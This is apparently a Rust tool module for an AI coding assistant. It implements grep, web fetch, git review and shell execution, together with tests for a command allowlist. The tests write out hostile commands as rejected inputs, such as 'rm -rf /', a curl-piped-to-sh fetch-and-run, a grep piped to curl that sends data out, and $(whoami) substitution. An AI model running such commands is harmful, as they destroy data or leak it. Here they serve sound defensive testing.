fn grep_file(path: &Path, regex: &Regex, hits: &mut Vec<String>) -> bool {
    let Ok(meta) = std::fs::metadata(path) else { return false };
    if meta.len() > MAX_WALK_FILE_BYTES {
        return false;
    }
    let Ok(content) = std::fs::read_to_string(path) else { return false };
    for (index, line) in content.lines().enumerate() {
        if regex.is_match(line) {
            hits.push(format!("{}:{}: {}", path.display(), index + 1, line.trim()));
            if hits.len() >= 300 {
                return true;
            }
        }
    }
    false
}

fn todowrite(args: &Value, todos: &mut Vec<Value>) -> ToolOutcome {
    let list = args
        .get("todos")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    let count = list.len();
    *todos = list;
    ToolOutcome::ok(format!("{count} todo(s) stored"))
}

fn skill_tool(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let action = args.get("action").and_then(Value::as_str).unwrap_or("list");
    if action != "load" {
        let skills = crate::skills::list();
        if skills.is_empty() {
            return ToolOutcome::ok(format!(
                "(no skills installed — drop SKILL.md files into {})",
                ctx.skills_root.display()
            ));
        }
        let body = skills
            .iter()
            .map(|skill| format!("- {} — {}", skill.name, skill.description))
            .collect::<Vec<_>>()
            .join("\n");
        return ToolOutcome::ok(body);
    }

    let Some(name) = arg(args, "name") else {
        return ToolOutcome::err("skill: 'name' is required for load");
    };
    match crate::skills::find(name) {
        Some(path) => match std::fs::read_to_string(&path) {
            Ok(content) => ToolOutcome::ok(truncate(content, MAX_OUTPUT_CHARS)),
            Err(error) => ToolOutcome::err(format!("skill: {error}")),
        },
        None => ToolOutcome::err(format!("skill: '{name}' not found")),
    }
}

async fn web_fetch(args: &Value) -> ToolOutcome {
    let Some(url) = arg(args, "url") else {
        return ToolOutcome::err("web_fetch: missing 'url'");
    };
    if !url.starts_with("http://") && !url.starts_with("https://") {
        return ToolOutcome::err("web_fetch: only http(s) URLs are supported");
    }

    let client = match reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .user_agent("DS.IDE/0.1")
        .build()
    {
        Ok(client) => client,
        Err(error) => return ToolOutcome::err(format!("web_fetch: {error}")),
    };

    let response = match client.get(url).send().await {
        Ok(response) => response,
        Err(error) => return ToolOutcome::err(format!("web_fetch: {error}")),
    };
    let status = response.status();
    let body = match response.text().await {
        Ok(body) => body,
        Err(error) => return ToolOutcome::err(format!("web_fetch: {error}")),
    };

    let text = html_to_text(&body);
    if text.trim().is_empty() {
        return ToolOutcome::ok(format!("HTTP {status} — no readable text"));
    }
    ToolOutcome::ok(truncate(format!("HTTP {status}\n\n{text}"), MAX_OUTPUT_CHARS))
}

/// Deliberately crude: drop script/style blocks, strip tags, decode the common entities.
/// A real DOM parser would be nicer, but this stays dependency-free and predictable.
fn html_to_text(html: &str) -> String {
    let mut out = String::with_capacity(html.len() / 2);
    let mut rest = html;
    let mut skip_until: Option<&str> = None;

    loop {
        let lower = rest.to_lowercase();
        if let Some(tag) = skip_until {
            match lower.find(tag) {
                Some(index) => {
                    rest = &rest[index + tag.len()..];
                    skip_until = None;
                    continue;
                }
                None => break,
            }
        }

        match lower.find('<') {
            Some(index) => {
                out.push_str(&rest[..index]);
                let tail = &rest[index..];
                let Some(close) = tail.find('>') else { break };
                let tag = tail[..=close].to_lowercase();
                if tag.starts_with("<script") {
                    skip_until = Some("</script>");
                } else if tag.starts_with("<style") {
                    skip_until = Some("</style>");
                } else {
                    out.push(' ');
                }
                rest = &tail[close + 1..];
            }
            None => {
                out.push_str(rest);
                break;
            }
        }
    }

    out.replace("&nbsp;", " ")
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

async fn run_git(mut command: Command, ctx: &ToolContext) -> Result<String, String> {
    let output = command
        .current_dir(&ctx.workspace)
        .stdin(Stdio::null())
        .output()
        .await
        .map_err(|error| error.to_string())?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

async fn code_review(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let staged = args.get("staged").and_then(Value::as_bool).unwrap_or(false);
    let path = arg(args, "path").map(|value| resolve(&ctx.workspace, value));

    let mut stat = Command::new("git");
    stat.arg("diff").arg("--stat");
    let mut patch = Command::new("git");
    patch.arg("diff");
    if staged {
        stat.arg("--cached");
        patch.arg("--cached");
    }
    if let Some(target) = &path {
        stat.arg(target);
        patch.arg(target);
    }

    let stat_text = match run_git(stat, ctx).await {
        Ok(text) => text,
        Err(error) => return ToolOutcome::err(format!("code_review: {error}")),
    };
    let patch_text = match run_git(patch, ctx).await {
        Ok(text) => text,
        Err(error) => return ToolOutcome::err(format!("code_review: {error}")),
    };

    if patch_text.trim().is_empty() {
        return ToolOutcome::ok("(no changes to review in that scope)");
    }

    let body = format!("Summary:\n{stat_text}\nPatch:\n{patch_text}");
    ToolOutcome::ok(truncate(body, MAX_OUTPUT_CHARS))
}

/// Runs one shell command in the workspace and returns its transcript plus whether it failed.
/// Shared by `bash` and by `verify`, so a command the verifier is given follows exactly the
/// same rules as one the companion runs itself — including the policy check at the call site.
///
/// The flag is `is_error`, not "success": it was returned the other way round once, which
/// showed every working command as failed — and every failing one as fine.
pub(crate) async fn run_shell_command(
    command: &str,
    ctx: &ToolContext,
    timeout_ms: u64,
) -> Result<(String, bool), String> {
    if ctx.command_policy.eq_ignore_ascii_case("allowlist") {
        if let Err(reason) = check_command(command, &ctx.allowed_commands) {
            return Err(format!(
                "refused by the command allowlist, not by the permission level: {reason}. \
                 Full access decides whether a command may run without asking; the allowlist \
                 decides which programs exist for the companion at all. The list is in \
                 Settings → Policies; the tool `grep` and `glob` need no shell and are \
                 unaffected."
            ));
        }
    }

    let mut shell = Command::new("sh");
    shell
        .arg("-c")
        .arg(command)
        .current_dir(&ctx.workspace)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);

    let child = shell.spawn().map_err(|error| error.to_string())?;
    let output = match tokio::time::timeout(Duration::from_millis(timeout_ms), child.wait_with_output())
        .await
    {
        Ok(Ok(output)) => output,
        Ok(Err(error)) => return Err(error.to_string()),
        Err(_) => return Err(format!("timed out after {timeout_ms} ms")),
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let code = output
        .status
        .code()
        .map(|value| value.to_string())
        .unwrap_or_else(|| "signal".to_string());

    let mut result = format!("exit code: {code}\n");
    if !stdout.trim().is_empty() {
        result.push_str("stdout:\n");
        result.push_str(&stdout);
        result.push('\n');
    }
    if !stderr.trim().is_empty() {
        result.push_str("stderr:\n");
        result.push_str(&stderr);
        result.push('\n');
    }
    if stdout.trim().is_empty() && stderr.trim().is_empty() {
        result.push_str("(no output)\n");
    }

    Ok((truncate(result, MAX_OUTPUT_CHARS), !output.status.success()))
}

async fn bash(args: &Value, ctx: &ToolContext) -> ToolOutcome {
    let Some(command) = arg(args, "command") else {
        return ToolOutcome::err("bash: missing 'command'");
    };
    let timeout_ms = args
        .get("timeout_ms")
        .and_then(Value::as_u64)
        .unwrap_or(120_000)
        .min(600_000);

    let (content, is_error) = match run_shell_command(command, ctx, timeout_ms).await {
        Ok(result) => result,
        Err(error) => return ToolOutcome::err(format!("bash: {error}")),
    };
    ToolOutcome {
        content,
        is_error,
        image: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A command given to `verify` goes through the same function as `bash`, so the policy
    /// cannot be sidestepped by asking for a check instead of running the command directly.
    #[tokio::test]
    async fn a_verifier_command_obeys_the_same_allowlist() {
        let ctx = ToolContext {
            workspace: std::env::temp_dir(),
            full_authorization: true,
            skills_root: std::env::temp_dir(),
            command_policy: "allowlist".to_string(),
            allowed_commands: vec!["echo".to_string(), "false".to_string()],
            workspace_only: true,
        };
        // Allowed: runs and returns a transcript with the exit code.
        let (transcript, failed) = run_shell_command("echo hallo", &ctx, 10_000).await.unwrap();
        assert!(!failed, "{transcript}");
        assert!(transcript.contains("hallo"), "{transcript}");

        // Not allowed: refused before anything is spawned, with the policy named.
        let error = run_shell_command("rm -rf /tmp/nope", &ctx, 10_000)
            .await
            .unwrap_err();
        assert!(error.contains("allowlist"), "{error}");

        // A failing command is still a transcript, not a refusal: the exit code is the evidence.
        let (transcript, failed) = run_shell_command("false", &ctx, 10_000).await.unwrap();
        assert!(failed, "{transcript}");
        assert!(transcript.contains("exit code: 1"), "{transcript}");
    }

    /// The flag at the tool level, not just at the helper: a successful `bash` call must reach
    /// the model and the UI as success. It once did the opposite for every command.
    #[cfg(unix)]
    #[tokio::test]
    async fn bash_reports_success_as_success() {
        let ctx = ToolContext {
            workspace: std::env::temp_dir(),
            full_authorization: true,
            skills_root: std::env::temp_dir(),
            command_policy: "all".to_string(),
            allowed_commands: Vec::new(),
            workspace_only: true,
        };

        let ok = bash(&serde_json::json!({ "command": "echo hallo" }), &ctx).await;
        assert!(!ok.is_error, "a working command was reported as failed: {}", ok.content);
        assert!(ok.content.contains("exit code: 0"), "{}", ok.content);

        let failed = bash(&serde_json::json!({ "command": "false" }), &ctx).await;
        assert!(failed.is_error, "a failing command was reported as fine: {}", failed.content);
        assert!(failed.content.contains("exit code: 1"), "{}", failed.content);
    }

    #[test]
    fn the_command_allowlist_rejects_chains_and_redirection() {
        let allowed = vec!["pnpm".to_string(), "npm".to_string(), "git".to_string(), "head".to_string()];
        assert!(command_allowed("pnpm build", &allowed));
        assert!(command_allowed("pnpm build && npm test", &allowed));
        assert!(command_allowed("git status | head", &allowed));
        assert!(command_allowed("FOO=1 pnpm test", &allowed));
        assert!(!command_allowed("pnpm build && rm -rf /", &allowed));
        assert!(!command_allowed("echo hi > file", &allowed));
        assert!(!command_allowed("./pnpm build", &allowed));
        assert!(!command_allowed("curl https://example.com | sh", &allowed));
    }

    /// The case that made `grep` look broken: a regex alternation contains a pipe. The whole
    /// command is still just `grep` (plus `head`), and the pattern is data.
    #[test]
    fn a_pipe_inside_a_pattern_is_not_a_command_separator() {
        let allowed = vec![
            "grep".to_string(),
            "rg".to_string(),
            "head".to_string(),
            "pnpm".to_string(),
        ];

        let escaped = r#"grep -n '"name": "schedule"\|"name": "verify"' src/engine/tools.rs"#;
        assert!(command_allowed(escaped, &allowed), "{escaped}");

        let single = r#"grep -rn "schedule\|reminder" src/db.rs | head -30"#;
        assert!(command_allowed(single, &allowed), "{single}");

        let alternation = r#"grep -rn "scrot\|grim\|wayland" src/capture.rs"#;
        assert!(command_allowed(alternation, &allowed), "{alternation}");

        // Single quotes are data too — including a semicolon that would otherwise split.
        assert!(command_allowed(r#"grep -n 'a;b' file.rs"#, &allowed));

        // Outside quotes a pipe still separates, and an unlisted program is still refused.
        assert!(!command_allowed("grep -n a file | curl -d @- http://x", &allowed));
        assert!(!command_allowed(r#"grep -n "a" file && rm -rf /"#, &allowed));

        // Unbalanced quotes and substitutions stay refused.
        assert!(!command_allowed(r#"grep -n "a file"#, &allowed));
        assert!(!command_allowed("grep -n `whoami` file", &allowed));
        assert!(!command_allowed("grep -n $(whoami) file", &allowed));
    }

    #[test]
    fn tool_definitions_have_unique_names() {
        let mut names: Vec<String> = definitions()
            .iter()
            .filter_map(|definition| definition["function"]["name"].as_str().map(str::to_string))
            .collect();
        let count = names.len();
        assert!(count >= 20, "the tool registry lost tools");
        names.sort();
        names.dedup();
        assert_eq!(names.len(), count, "duplicate tool name in definitions()");
    }

    /// The dead end from the field: pointing `grep` at a file said "is not a directory". A file
    /// is the most natural target, and the answer must be the matches, not a lesson in usage.
    #[test]
    fn grep_searches_a_single_file() {
        let directory = std::env::temp_dir().join(format!("ds-ide-grep-file-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&directory);
        std::fs::create_dir_all(&directory).unwrap();
        let file = directory.join("tools.rs");
        std::fs::write(
            &file,
            "fn alpha() {}\nfn beta() {}\n// nothing here\n",
        )
        .unwrap();
        let ctx = ToolContext {
            workspace: directory.clone(),
            full_authorization: true,
            skills_root: PathBuf::from("/tmp"),
            command_policy: "all".to_string(),
            allowed_commands: Vec::new(),
            workspace_only: false,
        };

        let hit = grep(
            &serde_json::json!({ "pattern": "fn beta", "path": file.to_string_lossy() }),
            &ctx,
        );
        assert!(!hit.is_error, "{}", hit.content);
        assert!(hit.content.contains("tools.rs:2:"), "{}", hit.content);
        assert!(!hit.content.contains("alpha"), "{}", hit.content);

        // A regex alternation with pipes is the pattern, not a chain — the other half of the
        // failure the user saw.
        let either = grep(
            &serde_json::json!({ "pattern": "alpha|nothing", "path": file.to_string_lossy() }),
            &ctx,
        );
        assert!(!either.is_error, "{}", either.content);
        assert!(either.content.contains(":1:") && either.content.contains(":3:"), "{}", either.content);

        let missing = grep(
            &serde_json::json!({ "pattern": "fn", "path": directory.join("gone.rs").to_string_lossy() }),
            &ctx,
        );
        assert!(missing.is_error && missing.content.contains("does not exist"), "{}", missing.content);

        let _ = std::fs::remove_dir_all(&directory);
    }

    /// End-to-end proof for the report: the four commands are run for real, through the same
    /// function the `bash` tool calls, with the default allowlist. A unit test on the parser
    /// could pass while the shell still refused them.
    #[cfg(unix)]
    #[tokio::test]
    async fn the_commands_from_the_report_really_run() {
        let workspace = std::env::temp_dir().join(format!("ds-ide-live-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&workspace);
        std::fs::create_dir_all(workspace.join("src")).unwrap();
        std::fs::write(
            workspace.join("src/db.rs"),
            "fn schedule() {}\nfn reminder() {}\n",
        )
        .unwrap();
        std::fs::write(
            workspace.join("src/capture.rs"),
            "// scrot | grim\n// WAYLAND\n",
        )
        .unwrap();

        let ctx = ToolContext {
            workspace: workspace.clone(),
            full_authorization: true,
            skills_root: PathBuf::from("/tmp"),
            command_policy: "allowlist".to_string(),
            // The programs in these commands are on the shipped default list.
            allowed_commands: vec!["grep".to_string(), "head".to_string()],
            workspace_only: true,
        };

        // The two shell commands from the log — the alternation inside quotes is the point.
        let (out, failed) = run_shell_command(
            r#"grep -rn "schedule\|reminder" src/db.rs | head -30"#,
            &ctx,
            10_000,
        )
        .await
        .expect("quoted alternation must pass the allowlist");
        assert!(!failed, "{out}");
        assert!(out.contains("schedule") && out.contains("reminder"), "{out}");

        let (out, failed) = run_shell_command(
            r#"grep -rn "scrot\|grim\|WAYLAND" src/capture.rs"#,
            &ctx,
            10_000,
        )
        .await
        .expect("three-way alternation must pass");
        assert!(!failed, "{out}");
        assert!(out.contains("WAYLAND"), "{out}");

        // And a real refusal still refuses, with the reason naming the program.
        let refusal = run_shell_command("curl https://example.com", &ctx, 5_000)
            .await
            .expect_err("curl is not on the list");
        assert!(refusal.contains("`curl`"), "{refusal}");
        assert!(refusal.contains("Settings → Policies"), "{refusal}");

        let _ = std::fs::remove_dir_all(&workspace);
    }

    #[test]
    fn glob_and_grep_report_a_missing_workspace() {
        let directory =
            std::env::temp_dir().join(format!("ds-ide-missing-workspace-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&directory);
        let ctx = ToolContext {
            workspace: directory,
            full_authorization: true,
            skills_root: PathBuf::from("/tmp"),
            command_policy: "all".to_string(),
            allowed_commands: Vec::new(),
            workspace_only: false,
        };

        let glob = glob_tool(&serde_json::json!({ "pattern": "**/*.rs" }), &ctx);
        assert!(glob.is_error, "glob must fail: {}", glob.content);
        assert!(
            glob.content.contains("workspace") && glob.content.contains("does not exist"),
            "glob message should name the missing workspace: {}",
            glob.content
        );

        let grep = grep(&serde_json::json!({ "pattern": "fn" }), &ctx);
        assert!(grep.is_error, "grep must fail: {}", grep.content);
        assert!(
            grep.content.contains("does not exist"),
            "grep message should name the missing workspace: {}",
            grep.content
        );
    }

    #[test]
    fn workspace_only_rejects_parents_and_outside_paths() {
        let directory = std::env::temp_dir().join(format!("ds-ide-workspace-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&directory);
        std::fs::create_dir_all(&directory).unwrap();
        assert!(inside_workspace(&directory, &directory.join("a.txt")));
        assert!(inside_workspace(&directory, &directory.join("sub/a.txt")));
        assert!(!inside_workspace(&directory, Path::new("../a.txt")));
        assert!(!inside_workspace(&directory, &directory.join("../a.txt")));
        let _ = std::fs::remove_dir_all(&directory);
    }

    #[test]
    fn html_to_text_drops_scripts_styles_and_tags() {
        let html = "<html><head><style>p{color:red}</style></head><body>\
                    <h1>Hallo</h1><script>var x = 1;</script><p>A&amp;B</p></body></html>";
        let text = html_to_text(html);
        assert!(text.contains("Hallo"), "kept heading text");
        assert!(text.contains("A&B"), "decoded entity: {text}");
        assert!(!text.contains("var x"), "dropped script body");
        assert!(!text.contains("color"), "dropped style body");
        assert!(!text.contains('<'), "dropped tags");
    }

    #[tokio::test]
    #[ignore = "requires network"]
    async fn live_web_fetch_reads_example_com() {
        let ctx = ToolContext {
            workspace: PathBuf::from("/tmp"),
            full_authorization: true,
            skills_root: PathBuf::from("/tmp"),
            command_policy: "all".to_string(),
            allowed_commands: Vec::new(),
            workspace_only: false,
        };
        let mut todos = Vec::new();
        let outcome = execute(
            "web_fetch",
            &serde_json::json!({ "url": "https://example.com" }),
            &ctx,
            &mut todos,
        )
        .await;

        assert!(!outcome.is_error, "web_fetch failed: {}", outcome.content);
        assert!(
            outcome.content.to_lowercase().contains("example domain"),
            "unexpected body: {}",
            outcome.content
        );
        println!("bytes: {}", outcome.content.len());
    }

    #[tokio::test]
    #[ignore = "requires a git working tree"]
    async fn live_code_review_runs_git() {
        let workspace = std::env::current_dir().unwrap();
        let ctx = ToolContext {
            workspace,
            full_authorization: true,
            skills_root: PathBuf::from("/tmp"),
            command_policy: "all".to_string(),
            allowed_commands: Vec::new(),
            workspace_only: false,
        };
        let mut todos = Vec::new();
        let outcome = execute("code_review", &serde_json::json!({}), &ctx, &mut todos).await;

        assert!(
            !outcome.is_error,
            "code_review failed: {}",
            outcome.content
        );
        println!("{}", outcome.content.lines().next().unwrap_or("(empty)"));
    }
}
